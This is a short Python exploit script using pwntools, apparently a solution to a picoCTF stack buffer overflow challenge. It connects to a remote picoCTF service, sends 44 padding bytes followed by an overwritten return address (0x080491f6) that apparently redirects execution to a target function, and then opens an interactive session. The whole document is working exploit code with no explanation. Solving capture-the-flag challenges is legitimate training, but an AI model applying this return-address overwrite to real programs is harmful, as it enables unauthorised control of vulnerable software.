from pwn import *

io = remote('saturn.picoctf.net',50591)
# io = process('./vuln')
payload = b'A'*44 + p32(0x080491f6)

print('hi there')

io.sendlineafter(':',payload)

io.interactive()
